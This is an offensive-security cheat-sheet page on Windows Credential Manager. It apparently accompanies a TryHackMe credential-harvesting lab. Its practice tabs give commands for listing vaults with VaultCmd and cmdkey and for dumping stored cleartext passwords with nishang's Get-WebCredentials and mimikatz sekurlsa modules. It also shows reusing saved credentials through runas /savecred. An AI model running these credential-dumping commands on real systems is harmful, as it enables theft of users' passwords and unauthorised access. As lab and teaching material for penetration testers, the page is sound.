# Windows Credential Manager

## Theory

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

* Web credentials contain authentication details stored in Internet browsers or other applications.
* Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
* Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
* Certificate-based credentials: Athunticated details based on certifications.

## Practice

{% tabs %}
{% tab title="Enum" %}
On Windows systems Vaultcmd & cmdkey can be used to list credentials.

```bash
# List vaults
C:\Users\Administrator> VaultCmd /list

# Extract and decrypt all master keys
sekurlsa::dpapi

# List property of a vault
C:\Users\Administrator> VaultCmd /listproperties:"Web Credentials"

# List creds in a vault
C:\Users\Administrator> VaultCmd /listcreds:"Web Credentials"

# List creds with cmdkey
C:\Users\Administrator> cmdkey /list
```
{% endtab %}

{% tab title="Dump" %}
Vaultcmd can't show credentials. We have to use alternate methods such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)

```bash
# Get cleartext password
PS> Import-Module C:\Tools\Get-WebCredentials.ps1
PS> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

An alternative method of taking advantage of stored credentials is by using RunAs

```bash
# Runas with saved credential for "THM.red\thm-local"
C:\Users\Administrator> runas /savecred /user:THM.red\thm-local cmd.exe

# We also can use mimikatz to dump creds

mimikatz# privilege::debug
Privilege '20' OK

mimikatz# sekurlsa::credman
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/credharvesting" %}
